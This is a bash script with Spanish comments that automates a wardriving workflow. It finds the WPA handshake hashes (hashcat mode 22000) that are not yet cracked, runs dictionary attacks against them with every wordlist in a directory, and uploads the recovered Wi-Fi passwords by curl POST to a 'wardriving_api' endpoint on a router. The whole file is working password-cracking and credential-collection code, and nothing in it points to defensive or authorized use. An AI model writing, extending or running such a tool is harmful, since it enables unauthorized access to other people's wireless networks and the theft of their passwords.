#!/bin/bash
HC2200_FILE=$1
ROUTER_IP=$2
ROUTER_TOKEN=$3
DICT_DIR=$4

HASHCAT_BIN="/root/hashcat-7.1.2/hashcat.bin"
POTFILE="/root/hashcat-7.1.2/hashcat.potfile"
PENDING_SYNC="/root/pending_sync.txt"

exec 9>/tmp/hashcat_queue.lock
flock 9

echo "[*] Iniciando: $HC2200_FILE"

# Obtener directamente los hashes sin crackear segun el potfile.
# --left es la fuente de verdad: lo que no esta en el potfile todavia.
$HASHCAT_BIN --potfile-path="$POTFILE" -m 22000 --left "$HC2200_FILE" \
    2>/dev/null > "/tmp/new_targets.hc2200"

if [ ! -s "/tmp/new_targets.hc2200" ]; then
    echo "[*] Todos los hashes ya estan en el potfile. Ignorando."
    rm -f "$HC2200_FILE" "/tmp/new_targets.hc2200"
    exec 9>&-
    exit 0
fi

NEW_COUNT=$(wc -l < "/tmp/new_targets.hc2200")
TOTAL_COUNT=$(wc -l < "$HC2200_FILE")
echo "[*] $NEW_COUNT/$TOTAL_COUNT hashes pendientes de crackear."

dicts=$(find "$DICT_DIR" -maxdepth 1 -type f 2>/dev/null | sort -V)

for dict in $dicts; do
    [ -f "$dict" ] || continue
    echo "[*] Probando diccionario: $(basename "$dict")"

    $HASHCAT_BIN --potfile-path="$POTFILE" -m 22000 -a 0 -w 3 \
        --status --status-timer=30 "/tmp/new_targets.hc2200" "$dict"

    # Sincronizar cracks al router
    $HASHCAT_BIN --potfile-path="$POTFILE" -m 22000 --show "/tmp/new_targets.hc2200" \
        2>/dev/null > "/tmp/current_cracked.txt"

    if [ -s "/tmp/current_cracked.txt" ]; then
        cat "/tmp/current_cracked.txt" >> "$PENDING_SYNC"
        sort -u "$PENDING_SYNC" -o "$PENDING_SYNC" 2>/dev/null
    fi

    if [ -s "$PENDING_SYNC" ]; then
        TOTAL=$(wc -l < "$PENDING_SYNC")
        echo "[*] Sincronizando $TOTAL contrasenas..."
        HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" -X POST \
            -H "Content-Type: text/plain" \
            --data-binary @"$PENDING_SYNC" \
            "http://$ROUTER_IP/cgi-bin/wardriving_api?action=upload_potfile&token=$ROUTER_TOKEN" \
            --connect-timeout 10)
        if [ "$HTTP_CODE" = "200" ]; then
            echo "[+] Sincronizacion exitosa."
            rm -f "$PENDING_SYNC"
        fi
    fi

    # Salir solo si no quedan hashes sin crackear
    $HASHCAT_BIN --potfile-path="$POTFILE" -m 22000 --left "/tmp/new_targets.hc2200" \
        2>/dev/null > "/tmp/current_left.txt"
    if [ ! -s "/tmp/current_left.txt" ]; then
        echo "[*] No quedan hashes. Terminando."
        break
    fi
done

echo "[*] Proceso finalizado."
rm -f "$HC2200_FILE" "/tmp/new_targets.hc2200" "/tmp/current_cracked.txt" "/tmp/current_left.txt"

exec 9>&-
